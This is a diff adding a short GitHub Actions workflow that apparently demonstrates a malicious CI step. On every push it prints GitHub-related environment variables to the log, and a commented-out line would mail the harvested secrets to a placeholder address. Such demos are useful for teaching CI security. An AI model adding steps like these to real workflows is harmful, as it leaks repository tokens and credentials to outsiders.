@@ -1,0 +1,19 @@
+name: Insecure GitHub Action Demo
+
+on: push
+
+jobs:
+  compromised_action:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v3
+
+      - name: 🔥 Exfiltrating Secrets
+        run: |
+          echo "⚠️ RUNNING MALICIOUS ACTION..."
+          echo "🔓 Leaked Secrets:"
+          env | grep -i 'github'  # Print GitHub-related environment variables
+          
+          # OPTIONAL: Email the stolen secrets (uncomment below)
+          # echo "🔥 GitHub Secrets: $(env | grep -i 'github')" | mail -s "Secrets Leak" your-email@example.com
